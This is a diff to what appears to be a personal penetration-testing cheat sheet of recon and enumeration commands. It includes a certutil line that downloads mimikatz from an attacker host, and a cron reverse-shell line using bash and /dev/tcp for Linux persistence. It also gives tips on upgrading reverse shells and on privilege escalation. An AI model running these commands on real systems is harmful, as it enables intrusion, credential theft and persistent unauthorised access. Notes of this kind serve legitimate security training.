@@ -1,3 +1,5 @@
+##DON'T DEPEND ON METASPLOIT COMPLETELY##
+**Searchsploit & msfvenom > msfvenom**
 - **host** - for dns lookups
 - **httrack** - for downloading a website's files
 - **whois**- used for whois info like registrat, owners etc.
@@ -24,20 +26,20 @@ netstat -ano
 - windows process enum commands: net start, wmic service list brief, tasklist /SVC, schtasks /query /fo LIST
 - To run the JAWS script type: powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
 - LINUX ENUM COMMANDS:
-cat /etc/issue
-cat /etc/[*]release
-uname -a
-lscpu
-df -h*
-groups root
-cat /etc/passwd
-lastlog
-netstat
-route
-ip a s
-cat /etc/networks
-cat /etc/hosts
-cat /etc/resolv.conf
+-- cat /etc/issue
+-- cat /etc/[*]release
+-- uname -a
+-- lscpu
+-- df -h*
+-- groups root
+-- cat /etc/passwd
+-- lastlog
+-- netstat
+-- route
+-- ip a s
+-- cat /etc/networks
+-- cat /etc/hosts
+-- cat /etc/resolv.conf
 
 - command for transferring files through a windows shell : ```
 certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
@@ -80,4 +82,6 @@ certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
 - use **who** to see which use has logged in remotely.
 - use **lastlog** see who has last logged in remotely.
 - use https://github.com/itm4n/PrivescCheck powershell script for privilege escalation in windows.
-- use the following for linux persistence: ***** /bin/bash -c 'bash -i &> /dev/tcp/<LHOST>/<LPORT> 0>&1'
+- use the following for linux persistence through cron: ***** /bin/bash -c 'bash -i &> /dev/tcp/<LHOST>/<LPORT> 0>&1'
+- After getting a reverse shell through .php, .c, .py or .exe files, use revshells to get a reverse shell to get a netcat shell on the attacker machine. This increases the extent of accessibility.
+- Next setup a python server on the directory containing linux-exploit-suggester or windows-exploit-suggester for privilege escalation based on the target machine.
